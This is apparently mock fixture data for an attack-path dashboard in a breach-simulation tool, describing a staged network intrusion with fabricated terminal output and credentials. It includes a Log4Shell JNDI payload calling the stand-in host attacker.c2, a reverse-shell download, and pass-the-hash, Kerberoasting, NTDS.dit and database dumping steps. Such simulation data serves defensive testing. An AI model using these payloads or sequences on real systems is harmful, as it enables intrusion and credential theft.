    // Phase 1 – External Recon & Initial Foothold
    { node_id: 's2-a01', node_type: 'ACTION', node_label: 'Nmap TCP SYN Scan', node_status: 'undetected', node_payload_name: 'nmap – TCP SYN Scan', node_executed_at: '2025-02-10T06:00:00Z', node_agent: 'openaev', node_ip: '10.0.1.10',
      node_terminal_output: `Starting Nmap 7.94 ( https://nmap.org )
Nmap scan report for WEB-SRV-01 (10.0.1.10)
Host is up (0.0008s latency).
PORT     STATE  SERVICE      VERSION
22/tcp   open   ssh          OpenSSH 8.2p1 Ubuntu
80/tcp   open   http         Apache httpd 2.4.41
443/tcp  open   ssl/https    Apache httpd 2.4.41
8080/tcp open   http-proxy   Nginx 1.18
8443/tcp open   ssl/https-alt
Nmap done: 1 IP address (1 host up) scanned in 3.12 seconds`,
      node_ports_found:['22/tcp open ssh OpenSSH 7.9p1', '80/tcp open http Apache 2.4.51', '443/tcp open ssl/https Apache 2.4.51', '8080/tcp open http Tomcat 9.0.54', '8443/tcp open ssl/https-alt'] },
    { node_id: 's2-a02', node_type: 'ACTION', node_label: 'Nuclei Log4Shell RCE', node_status: 'undetected', node_payload_name: 'nuclei – CVE-2021-44228', node_executed_at: '2025-02-10T06:03:22Z', node_agent: 'sentinel_one', node_ip: '10.0.1.10', node_user_privileges: 'www-data', node_accessed_files: ['/var/www/html/config.php'],
      node_terminal_output: `[INF] nuclei - Fast and customizable vulnerability scanner
[INF] Using Nuclei Engine 3.1.0
[INF] Templates loaded: CVE-2021-44228 (Log4Shell RCE)
[CVE-2021-44228] [http] [critical] http://10.0.1.10:8080/login
[*] Sending JNDI payload: ${'\$'}{jndi:ldap://attacker.c2:1389/exploit}
[+] Callback received from 10.0.1.10 — Remote Code Execution confirmed!
[+] whoami output: www-data
[+] Downloading reverse shell payload to /tmp/.x
[+] Shell spawned: www-data@WEB-SRV-01:/var/www/html$
[+] Privesc via CVE-2021-3156 (sudo heap overflow)... root achieved
[+] Reading /var/www/html/config.php — DB credentials extracted`,
      node_cves_found:['CVE-2021-44228 (Log4Shell JNDI RCE) - CRITICAL', 'CVE-2021-3156 (sudo heap overflow privesc) - HIGH'] },
    { node_id: 's2-a03', node_type: 'ACTION', node_label: 'SSH Credential Brute-Force', node_status: 'detected', node_payload_name: 'netexec – SSH brute force', node_executed_at: '2025-02-10T06:06:11Z', node_agent: 'palo_alto', node_ip: '10.0.1.15',
      node_terminal_output: `[*] Starting SSH brute force on MAIL-SRV-01 (10.0.1.15:22)
[*] Trying root:root ... FAILED (0.3s)
[*] Trying admin:admin ... FAILED (0.3s)
[*] Trying mail:mail123 ... FAILED (0.3s)
[!] DETECTION: Brute force detected by fail2ban after 3 attempts
[!] SIEM Alert: Multiple failed SSH logins from 10.0.1.10 — rule SSH_BRUTEFORCE triggered
[-] IP 10.0.1.10 blocked by firewall rule 403
[-] Attack DETECTED and partially mitigated` },
    { node_id: 's2-a04', node_type: 'ACTION', node_label: 'SSH Credential Spray', node_status: 'undetected', node_payload_name: 'netexec – SSH credential spray', node_executed_at: '2025-02-10T06:09:45Z', node_agent: 'sentinel_one', node_ip: '10.0.1.5', node_user_privileges: 'vpnuser',
      node_terminal_output: `SSH   10.0.1.5       22     VPN-GW-01      [*] Credential spray with config.php extracted credentials
SSH   10.0.1.5       22     VPN-GW-01      [+] tomcat:s3cr3t@dm1n ... SUCCESS
SSH   10.0.1.5       22     VPN-GW-01      [+] Session established as vpnuser@VPN-GW-01
SSH   10.0.1.5       22     VPN-GW-01      [*] id: uid=1001(vpnuser) gid=1001(vpnuser) groups=1001(vpnuser),27(sudo)
SSH   10.0.1.5       22     VPN-GW-01      [*] sudo -l: (ALL:ALL) NOPASSWD: /sbin/openvpn
SSH   10.0.1.5       22     VPN-GW-01      [+] Pivoting via OpenVPN into corporate network 10.0.10.0/24` },

    // Phase 2 – Internal Network Recon
    { node_id: 's2-a05', node_type: 'ACTION', node_label: 'Nmap Internal Network Scan', node_status: 'undetected', node_payload_name: 'nmap – TCP Connect Scan', node_executed_at: '2025-02-10T06:14:01Z', node_agent: 'openaev', node_ip: '10.0.10.0/24',
      node_terminal_output: `Starting Nmap 7.94 — scanning 10.0.10.0/24
Host: 10.0.10.101 (CORP-WS-01)  Ports: 135,139,445,3389
Host: 10.0.10.102 (CORP-WS-02)  Ports: 135,139,445,3389
Host: 10.0.10.103 (CORP-WS-03)  Ports: 135,139,445,3389,5985
Host: 10.0.10.104 (CORP-WS-04)  Ports: 135,139,445
Host: 10.0.10.105 (CORP-WS-05)  Ports: 135,139,445,3389
Host: 10.0.10.20  (PRINT-SRV-01) Ports: 135,139,445,9100
Nmap done: 254 IP addresses (6 hosts up) scanned in 12.7 seconds`,
      node_ports_found:['135/tcp open msrpc', '139/tcp open netbios-ssn', '445/tcp open microsoft-ds', '3389/tcp open ms-wbt-server RDP'] },
    { node_id: 's2-a06', node_type: 'ACTION', node_label: 'SMB AV Enumeration', node_status: 'undetected', node_payload_name: 'netexec – SMB enum_av', node_executed_at: '2025-02-10T06:16:30Z', node_agent: 'sentinel_one', node_ip: '10.0.10.103',
      node_terminal_output: `SMB   10.0.10.103  445    CORP-WS-03  [*] Windows 10.0 Build 19041 (domain:CORP)
SMB   10.0.10.103  445    CORP-WS-03  [+] CORP\\it.chen:Deploy2024! (Pwn3d!)
SMB   10.0.10.103  445    CORP-WS-03  [*] AV: Windows Defender (disabled — policy override)
SMB   10.0.10.103  445    CORP-WS-03  [+] Local admin group: CORP\\it.chen, CORP\\Domain Admins
SMB   10.0.10.103  445    CORP-WS-03  [+] Workstation fully accessible` },

    // Phase 3 – Workstation Lateral Movement
    { node_id: 's2-a07', node_type: 'ACTION', node_label: 'SMB Pass-the-Hash (WS-01)', node_status: 'undetected', node_payload_name: 'netexec – SMB pass-the-hash', node_executed_at: '2025-02-10T06:20:00Z', node_agent: 'palo_alto', node_ip: '10.0.10.101',
      node_terminal_output: `SMB   10.0.10.101  445    CORP-WS-01  [+] CORP\\acct.harris:<HASH> (Pwn3d!)
SMB   10.0.10.101  445    CORP-WS-01  [*] Spidering C:\\Finance\\ ...
SMB   10.0.10.101  445    CORP-WS-01  [+] Found: C:\\Finance\\Q3_Report.xlsx (44KB)
SMB   10.0.10.101  445    CORP-WS-01  [+] Exfiltrated 1 file (44 KB)` },
    { node_id: 's2-a08', node_type: 'ACTION', node_label: 'SMB Pass-the-Hash (WS-02)', node_status: 'undetected', node_payload_name: 'netexec – SMB pass-the-hash', node_executed_at: '2025-02-10T06:22:15Z', node_agent: 'openaev', node_ip: '10.0.10.102',
      node_terminal_output: `SMB   10.0.10.102  445    CORP-WS-02  [+] CORP\\hr.miller:<HASH> (Pwn3d!)
SMB   10.0.10.102  445    CORP-WS-02  [*] No sensitive files found in accessible shares
SMB   10.0.10.102  445    CORP-WS-02  [+] Credential cache extracted via lsass dump` },
    { node_id: 's2-a09', node_type: 'ACTION', node_label: 'SMB Pass-the-Hash (WS-04)', node_status: 'detected', node_payload_name: 'netexec – SMB pass-the-hash', node_executed_at: '2025-02-10T06:24:33Z', node_agent: 'openaev', node_ip: '10.0.10.104',
      node_terminal_output: `SMB   10.0.10.104  445    CORP-WS-04  [*] Attempting pass-the-hash...
SMB   10.0.10.104  445    CORP-WS-04  [+] Auth partial — session created but restricted
[!] DETECTION: Microsoft Defender ATP detected lateral movement from 10.0.10.103
[!] SIEM Alert: SMB_LATERAL_MOVEMENT — rule triggered on CORP-WS-04
[*] Attack detected — limited access achieved before containment` },
    { node_id: 's2-a10', node_type: 'ACTION', node_label: 'WMI Remote Exec (WS-05)', node_status: 'undetected', node_payload_name: 'netexec – WMI command exec', node_executed_at: '2025-02-10T06:26:45Z', node_agent: 'palo_alto', node_ip: '10.0.10.105', node_accessed_files: ['C:\\Finance\\Payroll_2024.xlsx'],
      node_terminal_output: `WMI   10.0.10.105  135    CORP-WS-05  [+] CORP\\fin.taylor:<HASH> Auth OK
WMI   10.0.10.105  135    CORP-WS-05  [*] Executing: cmd.exe /c dir C:\\Finance\\
WMI   10.0.10.105  135    CORP-WS-05  [+] Found C:\\Finance\\Payroll_2024.xlsx (1.2 MB)
WMI   10.0.10.105  135    CORP-WS-05  [*] Executing: xcopy C:\\Finance\\Payroll_2024.xlsx \\\\10.0.10.103\\C$\\Temp\\
WMI   10.0.10.105  135    CORP-WS-05  [+] File exfiltrated successfully` },
    { node_id: 's2-a11', node_type: 'ACTION', node_label: 'SMB Spider+ File Enum', node_status: 'undetected', node_payload_name: 'netexec – SMB spider_plus', node_executed_at: '2025-02-10T06:29:12Z', node_agent: 'palo_alto', node_ip: '10.0.10.20', node_accessed_files: ['C:\\Windows\\System32\\spool\\drivers\\'], node_credentials_found: ['CORP\\svc_mssql:Sql@2024Svc'],
      node_terminal_output: `SMB   10.0.10.20   445    PRINT-SRV-01  [+] CORP\\svc_print:<HASH> (Pwn3d!)
SMB   10.0.10.20   445    PRINT-SRV-01  [*] Spider+ scanning all shares...
SMB   10.0.10.20   445    PRINT-SRV-01  [+] C:\\Windows\\System32\\spool\\drivers\\ — 47 files indexed
SMB   10.0.10.20   445    PRINT-SRV-01  [+] Found credentials in printer config XML:
    svc_mssql / Sql@2024Svc (CORP domain)
SMB   10.0.10.20   445    PRINT-SRV-01  [+] Credential added to store` },

    // Phase 4 – Server Farm Breach
    { node_id: 's2-a12', node_type: 'ACTION', node_label: 'SSH Credential Reuse (APP)', node_status: 'undetected', node_payload_name: 'netexec – SSH login', node_executed_at: '2025-02-10T06:33:00Z', node_agent: 'palo_alto', node_ip: '10.0.20.10', node_accessed_files: ['/opt/app/config/db.conf'], node_credentials_found: ['mysql_root:R00tM3@Prod'],
      node_terminal_output: `SSH   10.0.20.10   22     APP-SRV-01    [+] appuser:s3cr3t@dm1n (from WEB-SRV-01 config) — SUCCESS
SSH   10.0.20.10   22     APP-SRV-01    [*] id: uid=1002(appuser) gid=1002(appuser)
SSH   10.0.20.10   22     APP-SRV-01    [*] cat /opt/app/config/db.conf
host=10.0.20.15
user=mysql_root
pass=R00tM3@Prod
database=production
SSH   10.0.20.10   22     APP-SRV-01    [+] Database credentials extracted` },
    { node_id: 's2-a13', node_type: 'ACTION', node_label: 'MSSQL SA Login Attempt', node_status: 'detected', node_payload_name: 'netexec – MSSQL exec', node_executed_at: '2025-02-10T06:36:22Z', node_agent: 'palo_alto', node_ip: '10.0.20.15',
      node_terminal_output: `MSSQL 10.0.20.15   1433   DB-SRV-01     [*] Trying SA login with extracted credentials
MSSQL 10.0.20.15   1433   DB-SRV-01     [*] SA:Admin@123 ... partial
[!] DETECTION: SQL Server Audit log triggered — failed elevated login attempt
[!] SIEM Alert: DB_PRIVESC_ATTEMPT from 10.0.20.10 to 10.0.20.15
MSSQL 10.0.20.15   1433   DB-SRV-01     [*] Attack detected before xp_cmdshell execution` },
    { node_id: 's2-a14', node_type: 'ACTION', node_label: 'SSH Root Privilege Escalation', node_status: 'undetected', node_payload_name: 'netexec – SSH privesc', node_executed_at: '2025-02-10T06:39:05Z', node_agent: 'palo_alto', node_ip: '10.0.20.15', node_user_privileges: 'mysql → root', node_accessed_files: ['/var/lib/mysql/'],
      node_terminal_output: `SSH   10.0.20.15   22     DB-SRV-01     [+] mysql_root:R00tM3@Prod — SUCCESS
SSH   10.0.20.15   22     DB-SRV-01     [*] Escalating via CVE-2022-0847 (Dirty Pipe)
SSH   10.0.20.15   22     DB-SRV-01     [+] Root shell obtained: uid=0(root)
SSH   10.0.20.15   22     DB-SRV-01     [*] Dumping MySQL: mysqldump -u root -pR00tM3@Prod --all-databases
SSH   10.0.20.15   22     DB-SRV-01     [+] Exfiltrated: /var/lib/mysql/ (4.7 GB dump initiated)` },

    // Phase 5 – Domain Compromise
    { node_id: 's2-a15', node_type: 'ACTION', node_label: 'LDAP Kerberoasting', node_status: 'undetected', node_payload_name: 'netexec – LDAP Kerberoasting', node_executed_at: '2025-02-10T06:43:11Z', node_agent: 'sentinel_one', node_ip: '10.0.20.5', node_credentials_found: ['$krb5tgs$23$*svc_mssql*...'],
      node_terminal_output: `LDAP  10.0.20.5    389    AD-01          [*] Querying AD-01 for Kerberoastable service accounts
LDAP  10.0.20.5    389    AD-01          [+] Found 5 kerberoastable accounts
LDAP  10.0.20.5    389    AD-01          svc_mssql@CORP.LOCAL (RC4, crackable)
LDAP  10.0.20.5    389    AD-01          svc_backup@CORP.LOCAL (RC4, crackable)
LDAP  10.0.20.5    389    AD-01          svc_deploy@CORP.LOCAL (AES256)
LDAP  10.0.20.5    389    AD-01          [+] TGS tickets saved: ./kerberoast/
$krb5tgs$23$*svc_mssql*CORP.LOCAL*[RC4_HASH_TRUNCATED]
[*] Hashcat offline crack estimated: ~2 hours on RTX 4090`,
      node_users_found:['CORP\\Administrator', 'CORP\\svc_mssql', 'CORP\\svc_print', 'CORP\\acct.harris', 'CORP\\it.chen', 'CORP\\fin.taylor', 'CORP\\svc_backup'] },
    { node_id: 's2-a16', node_type: 'ACTION', node_label: 'SMB Backup Operator Abuse', node_status: 'detected', node_payload_name: 'netexec – SMB backup_operator', node_executed_at: '2025-02-10T06:46:30Z', node_agent: 'openaev', node_ip: '10.0.20.5',
      node_terminal_output: `SMB   10.0.20.5    445    AD-01          [*] Attempting Backup Operator privilege abuse
SMB   10.0.20.5    445    AD-01          [*] Mounting C$ via backup operator rights...
[!] DETECTION: Windows Security Event ID 4624/4672 — special privilege assigned
[!] SIEM Correlation: DC_PRIVESC sequence detected — alert escalated to SOC
[-] Backup operator abuse detected before NTDS.dit copy completed` },
    { node_id: 's2-a17', node_type: 'ACTION', node_label: 'SMB NTDS.dit Dump', node_status: 'undetected', node_payload_name: 'netexec – SMB secretsdump', node_executed_at: '2025-02-10T06:49:50Z', node_agent: 'palo_alto', node_ip: '10.0.20.5', node_credentials_found: ['CORP\\Administrator:$HASH$...', 'All 347 domain accounts extracted'],
      node_terminal_output: `SMB   10.0.20.5    445    AD-01          [+] CORP\\Administrator:<HASH> (Domain Admin) Auth OK
SMB   10.0.20.5    445    AD-01          [*] Running secretsdump remotely via VSS shadow copy
SMB   10.0.20.5    445    AD-01          [+] NTDS.dit dump completed: 347 accounts
CORP\\Administrator:500:aad3b435b51404eeaad3b435b51404ee:[HASH]
CORP\\krbtgt:502:aad3b435b51404eeaad3b435b51404ee:[HASH]  
CORP\\svc_backup:1106:...[HASH]
[... 344 more accounts ...]
SMB   10.0.20.5    445    AD-01          [+] Golden Ticket material acquired (krbtgt hash)` },

    // Phase 6 – Management Zone
    { node_id: 's2-a18', node_type: 'ACTION', node_label: 'RDP Admin Login', node_status: 'undetected', node_payload_name: 'netexec – RDP login', node_executed_at: '2025-02-10T06:53:00Z', node_agent: 'palo_alto', node_ip: '10.0.30.10', node_user_privileges: 'CORP\\svc_jumphost (Admin)',
      node_terminal_output: `RDP   10.0.30.10   3389   JUMP-HOST-01  [+] CORP\\Administrator:<HASH> pass-the-hash — SUCCESS
RDP   10.0.30.10   3389   JUMP-HOST-01  [*] Remote desktop session established
RDP   10.0.30.10   3389   JUMP-HOST-01  [*] Host is jump server — multiple RDP sessions visible
RDP   10.0.30.10   3389   JUMP-HOST-01  [+] Credential cache harvested via Mimikatz` },
    { node_id: 's2-a19', node_type: 'ACTION', node_label: 'WMI Coerce Relay', node_status: 'detected', node_payload_name: 'netexec – WMI coerce_plus', node_executed_at: '2025-02-10T06:56:15Z', node_agent: 'openaev', node_ip: '10.0.30.101',
      node_terminal_output: `WMI   10.0.30.101  135    MGMT-WS-01    [*] Attempting NTLM coercion relay
WMI   10.0.30.101  135    MGMT-WS-01    [*] Triggering PrinterBug (MS-RPRN) authentication coerce
[!] DETECTION: Unusual WMI RPC call pattern detected by EDR
[!] SIEM Alert: NTLM_RELAY_ATTEMPT from 10.0.30.10 — investigation triggered
[-] Relay intercepted by network-level MitM detection` },
    { node_id: 's2-a20', node_type: 'ACTION', node_label: 'SMB GPP Autologin Dump', node_status: 'undetected', node_payload_name: 'netexec – SMB gpp_autologin', node_executed_at: '2025-02-10T06:58:40Z', node_agent: 'palo_alto', node_ip: '10.0.30.101', node_credentials_found: ['CORP\\mgmt.admin:Sup3rS3cr3t!'],
      node_terminal_output: `SMB   10.0.30.101  445    MGMT-WS-01    [+] CORP\\Administrator:<HASH> (Pwn3d!)
SMB   10.0.30.101  445    MGMT-WS-01    [*] Searching for AutoLogon credentials in registry
SMB   10.0.30.101  445    MGMT-WS-01    [+] HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon
    DefaultUserName: mgmt.admin
    DefaultPassword: Sup3rS3cr3t!
    DefaultDomain: CORP
SMB   10.0.30.101  445    MGMT-WS-01    [+] Plaintext credential extracted!` },

    // Phase 7 – Backup Server (blocked)
    { node_id: 's2-a21', node_type: 'ACTION', node_label: 'SSH Root Login Attempt', node_status: 'prevented', node_payload_name: 'netexec – SSH login', node_executed_at: '2025-02-10T07:01:20Z', node_agent: 'openaev', node_ip: '10.0.30.20',
      node_terminal_output: `SSH   10.0.30.20   22     BACKUP-01     [*] Attempting SSH with extracted credentials
SSH   10.0.30.20   22     BACKUP-01     [*] CORP\\mgmt.admin:Sup3rS3cr3t! ... FAILED
SSH   10.0.30.20   22     BACKUP-01     [*] root:root ... FAILED
[!] PREVENTION: SSH access from management network blocked by firewall policy
[!] Segment 10.0.30.0/24 → 10.0.30.20 restricted (backup isolation rule)
[-] Attack PREVENTED — network segmentation policy enforced` },
    { node_id: 's2-a22', node_type: 'ACTION', node_label: 'NFS Mount Probe', node_status: 'prevented', node_payload_name: 'netexec – NFS mount', node_executed_at: '2025-02-10T07:02:55Z', node_agent: 'openaev', node_ip: '10.0.30.20',
      node_terminal_output: `[*] Probing NFS exports on BACKUP-01 (10.0.30.20)
[*] showmount -e 10.0.30.20
clnt_create: RPC: Port mapper failure - Timed out
[!] PREVENTION: NFS port 2049 filtered by host-based firewall
[!] tcpwrappers /etc/hosts.deny: ALL EXCEPT backup_client_01
[-] NFS mount attempt PREVENTED — host firewall blocked connection` },

    // Bonus nmap scans — create intersection data for V4.3 (ports + credentials in same endpoints)
    { node_id: 's2-a23', node_type: 'ACTION', node_label: 'Nmap Print Server Scan', node_status: 'undetected', node_payload_name: 'nmap – TCP SYN Scan', node_executed_at: '2025-02-10T06:28:00Z', node_agent: 'openaev', node_ip: '10.0.10.20',
      node_terminal_output: `Starting Nmap 7.94 ( https://nmap.org )
Nmap scan report for PRINT-SRV-01 (10.0.10.20)
Host is up (0.0005s latency).
PORT     STATE  SERVICE        VERSION
135/tcp  open   msrpc          Microsoft Windows RPC
139/tcp  open   netbios-ssn    Microsoft Windows netbios-ssn
445/tcp  open   microsoft-ds   Windows Server 2016
9100/tcp open   jetdirect      HP JetDirect
Nmap done: 1 IP address (1 host up) scanned in 1.82 seconds` },
    { node_id: 's2-a24', node_type: 'ACTION', node_label: 'Nmap App Server Scan', node_status: 'undetected', node_payload_name: 'nmap – TCP SYN Scan', node_executed_at: '2025-02-10T06:32:00Z', node_agent: 'openaev', node_ip: '10.0.20.10',
      node_terminal_output: `Starting Nmap 7.94 ( https://nmap.org )
Nmap scan report for APP-SRV-01 (10.0.20.10)
Host is up (0.0006s latency).
PORT     STATE  SERVICE     VERSION
22/tcp   open   ssh         OpenSSH 8.0 (RHEL)
443/tcp  open   ssl/https   Apache httpd 2.4.6
3306/tcp open   mysql       MySQL 8.0.32
8080/tcp open   http-proxy  Nginx 1.20
Nmap done: 1 IP address (1 host up) scanned in 2.11 seconds` },
    { node_id: 's2-a25', node_type: 'ACTION', node_label: 'Nmap Domain Controller Scan', node_status: 'undetected', node_payload_name: 'nmap – TCP SYN Scan', node_executed_at: '2025-02-10T06:41:00Z', node_agent: 'openaev', node_ip: '10.0.20.5',
      node_terminal_output: `Starting Nmap 7.94 ( https://nmap.org )
Nmap scan report for AD-01 (10.0.20.5)
Host is up (0.0004s latency).
PORT     STATE  SERVICE       VERSION
53/tcp   open   domain        Simple DNS Plus
88/tcp   open   kerberos-sec  Microsoft Kerberos AD
135/tcp  open   msrpc         Microsoft Windows RPC
389/tcp  open   ldap          Microsoft Windows Active Directory
445/tcp  open   microsoft-ds  Windows Server 2022
636/tcp  open   ldapssl       Microsoft Active Directory LDAP
3268/tcp open   globalcatLDAP Microsoft Windows Active Directory
Nmap done: 1 IP address (1 host up) scanned in 1.94 seconds` },
    { node_id: 's2-a26', node_type: 'ACTION', node_label: 'Nmap Mgmt Workstation Scan', node_status: 'undetected', node_payload_name: 'nmap – TCP SYN Scan', node_executed_at: '2025-02-10T06:55:00Z', node_agent: 'openaev', node_ip: '10.0.30.101',
      node_terminal_output: `Starting Nmap 7.94 ( https://nmap.org )
Nmap scan report for MGMT-WS-01 (10.0.30.101)
Host is up (0.0007s latency).
PORT     STATE  SERVICE        VERSION
135/tcp  open   msrpc          Microsoft Windows RPC
139/tcp  open   netbios-ssn    Microsoft Windows
445/tcp  open   microsoft-ds   Windows 10 Enterprise
3389/tcp open   ms-wbt-server  Microsoft Terminal Services
5985/tcp open   wsman          Microsoft HTTPAPI httpd 2.0
Nmap done: 1 IP address (1 host up) scanned in 1.55 seconds` },
    // Nmap bulk discovery — covers remaining endpoints missing nmap coverage
    {
      node_id: 's2-a-nmap-bulk',
      node_type: 'ACTION',
      node_label: 'Nmap Multi-Subnet Discovery',
      node_status: 'undetected',
      node_payload_name: 'nmap – TCP SYN Scan (multi-subnet)',
      node_executed_at: '2025-02-10T06:01:00Z',
      node_agent: 'openaev',
      node_ip: '10.0.0.0/8',
      node_terminal_output: `Starting Nmap 7.94 ( https://nmap.org ) at 2025-02-10 06:01 UTC
Nmap scan report for 10.0.1.15 (MAIL-SRV-01)
Host is up (0.0009s latency).
PORT    STATE SERVICE    VERSION
22/tcp  open  ssh        OpenSSH 7.9p1 Debian
25/tcp  open  smtp       Postfix smtpd
143/tcp open  imap       Dovecot imapd
587/tcp open  submission Postfix smtpd

Nmap scan report for 10.0.1.5 (VPN-GW-01)
Host is up (0.0008s latency).
PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 7.4 (CentOS)
443/tcp  open  ssl/https  OpenVPN
1194/tcp open  openvpn    OpenVPN

Nmap scan report for 10.0.10.101 (CORP-WS-01)
Host is up (0.0010s latency).
PORT      STATE SERVICE       VERSION
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds  Windows 10
3389/tcp  open  ms-wbt-server Microsoft Terminal Services

Nmap scan report for 10.0.10.102 (CORP-WS-02)
Host is up (0.0011s latency).
PORT      STATE SERVICE       VERSION
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds  Windows 10
3389/tcp  open  ms-wbt-server

Nmap scan report for 10.0.10.103 (CORP-WS-03)
Host is up (0.0012s latency).
PORT      STATE SERVICE       VERSION
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds  Windows 10 Enterprise
3389/tcp  open  ms-wbt-server
5985/tcp  open  wsman

Nmap scan report for 10.0.10.104 (CORP-WS-04)
Host is up (0.0010s latency).
PORT      STATE SERVICE
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds

Nmap scan report for 10.0.10.105 (CORP-WS-05)
Host is up (0.0011s latency).
PORT      STATE SERVICE
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
3389/tcp  open  ms-wbt-server

Nmap scan report for 10.0.20.15 (DB-SRV-01)
Host is up (0.0006s latency).
PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 8.2p1 Ubuntu
3306/tcp open  mysql      MySQL 8.0.32
1433/tcp open  ms-sql-s   Microsoft SQL Server 2019

Nmap scan report for 10.0.30.10 (JUMP-HOST-01)
Host is up (0.0007s latency).
PORT      STATE SERVICE       VERSION
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds  Windows Server 2019
3389/tcp  open  ms-wbt-server Microsoft Terminal Services

Nmap scan report for 10.0.30.20 (BACKUP-01)
Host is up (0.0008s latency).
PORT    STATE SERVICE    VERSION
22/tcp  open  ssh        OpenSSH 8.9p1 Ubuntu
873/tcp open  rsync      rsync daemon

Nmap done: 254 IP addresses (10 hosts up) scanned in 34.2 seconds`,
    },
  ],

  attack_path_edges: [
    // ── chain_flow edges (linear attack chain) ───────────────────────────────
    { edge_id: 's2-c01', edge_source: 's2-a01', edge_target: 's2-a02', edge_type: 'chain_flow' },
    { edge_id: 's2-c02', edge_source: 's2-a02', edge_target: 's2-a03', edge_type: 'chain_flow', edge_label: 'pivot' },
    { edge_id: 's2-c03', edge_source: 's2-a03', edge_target: 's2-a04', edge_type: 'chain_flow', edge_label: 'pivot' },
    { edge_id: 's2-c04', edge_source: 's2-a04', edge_target: 's2-a05', edge_type: 'chain_flow', edge_label: 'internal recon' },
    { edge_id: 's2-c05', edge_source: 's2-a05', edge_target: 's2-a06', edge_type: 'chain_flow' },
    { edge_id: 's2-c06', edge_source: 's2-a06', edge_target: 's2-a07', edge_type: 'chain_flow', edge_label: 'lateral' },
    { edge_id: 's2-c07', edge_source: 's2-a07', edge_target: 's2-a08', edge_type: 'chain_flow', edge_label: 'lateral' },
    { edge_id: 's2-c08', edge_source: 's2-a08', edge_target: 's2-a09', edge_type: 'chain_flow', edge_label: 'lateral' },
    { edge_id: 's2-c09', edge_source: 's2-a09', edge_target: 's2-a10', edge_type: 'chain_flow', edge_label: 'lateral' },
    { edge_id: 's2-c10', edge_source: 's2-a10', edge_target: 's2-a11', edge_type: 'chain_flow', edge_label: 'lateral' },
    { edge_id: 's2-c11', edge_source: 's2-a11', edge_target: 's2-a12', edge_type: 'chain_flow', edge_label: 'server farm' },
    { edge_id: 's2-c12', edge_source: 's2-a12', edge_target: 's2-a13', edge_type: 'chain_flow' },
    { edge_id: 's2-c13', edge_source: 's2-a13', edge_target: 's2-a14', edge_type: 'chain_flow' },
    { edge_id: 's2-c14', edge_source: 's2-a14', edge_target: 's2-a15', edge_type: 'chain_flow', edge_label: 'pivot to DC' },
    { edge_id: 's2-c15', edge_source: 's2-a15', edge_target: 's2-a16', edge_type: 'chain_flow' },
    { edge_id: 's2-c16', edge_source: 's2-a16', edge_target: 's2-a17', edge_type: 'chain_flow' },
    { edge_id: 's2-c17', edge_source: 's2-a17', edge_target: 's2-a18', edge_type: 'chain_flow', edge_label: 'DA creds' },
    { edge_id: 's2-c18', edge_source: 's2-a18', edge_target: 's2-a19', edge_type: 'chain_flow', edge_label: 'lateral' },
    { edge_id: 's2-c19', edge_source: 's2-a19', edge_target: 's2-a20', edge_type: 'chain_flow' },
    { edge_id: 's2-c20', edge_source: 's2-a20', edge_target: 's2-a21', edge_type: 'chain_flow', edge_label: 'exfil attempt' },
    { edge_id: 's2-c21', edge_source: 's2-a21', edge_target: 's2-a22', edge_type: 'chain_flow' },

    // ── asset_link edges (action → targeted endpoint) ────────────────────────
    { edge_id: 's2-l01', edge_source: 's2-a01', edge_target: 's2-ep01', edge_type: 'asset_link' },
    { edge_id: 's2-l02', edge_source: 's2-a02', edge_target: 's2-ep01', edge_type: 'asset_link' },
    { edge_id: 's2-l03', edge_source: 's2-a03', edge_target: 's2-ep02', edge_type: 'asset_link' },
    { edge_id: 's2-l04', edge_source: 's2-a04', edge_target: 's2-ep03', edge_type: 'asset_link' },
    { edge_id: 's2-l05', edge_source: 's2-a05', edge_target: 's2-ep04', edge_type: 'asset_link' },
    { edge_id: 's2-l06', edge_source: 's2-a06', edge_target: 's2-ep06', edge_type: 'asset_link' },
    { edge_id: 's2-l07', edge_source: 's2-a07', edge_target: 's2-ep04', edge_type: 'asset_link' },
    { edge_id: 's2-l08', edge_source: 's2-a08', edge_target: 's2-ep05', edge_type: 'asset_link' },
    { edge_id: 's2-l09', edge_source: 's2-a09', edge_target: 's2-ep07', edge_type: 'asset_link' },
    { edge_id: 's2-l10', edge_source: 's2-a10', edge_target: 's2-ep08', edge_type: 'asset_link' },
    { edge_id: 's2-l11', edge_source: 's2-a11', edge_target: 's2-ep09', edge_type: 'asset_link' },
    { edge_id: 's2-l12', edge_source: 's2-a12', edge_target: 's2-ep10', edge_type: 'asset_link' },
    { edge_id: 's2-l13', edge_source: 's2-a13', edge_target: 's2-ep11', edge_type: 'asset_link' },
    { edge_id: 's2-l14', edge_source: 's2-a14', edge_target: 's2-ep11', edge_type: 'asset_link' },
    { edge_id: 's2-l15', edge_source: 's2-a15', edge_target: 's2-ep12', edge_type: 'asset_link' },
    { edge_id: 's2-l16', edge_source: 's2-a16', edge_target: 's2-ep12', edge_type: 'asset_link' },
    { edge_id: 's2-l17', edge_source: 's2-a17', edge_target: 's2-ep12', edge_type: 'asset_link' },
    { edge_id: 's2-l18', edge_source: 's2-a18', edge_target: 's2-ep13', edge_type: 'asset_link' },
    { edge_id: 's2-l19', edge_source: 's2-a19', edge_target: 's2-ep14', edge_type: 'asset_link' },
    { edge_id: 's2-l20', edge_source: 's2-a20', edge_target: 's2-ep14', edge_type: 'asset_link' },
    { edge_id: 's2-l21', edge_source: 's2-a21', edge_target: 's2-ep15', edge_type: 'asset_link' },
    { edge_id: 's2-l22', edge_source: 's2-a22', edge_target: 's2-ep15', edge_type: 'asset_link' },
    // Intersection nmap scans (same endpoints as credential-finding actions → multi-category in V4.3)
    { edge_id: 's2-l23', edge_source: 's2-a23', edge_target: 's2-ep09', edge_type: 'asset_link' },  // PRINT-SRV-01: creds + ports
    { edge_id: 's2-l24', edge_source: 's2-a24', edge_target: 's2-ep10', edge_type: 'asset_link' },  // APP-SRV-01: creds + ports
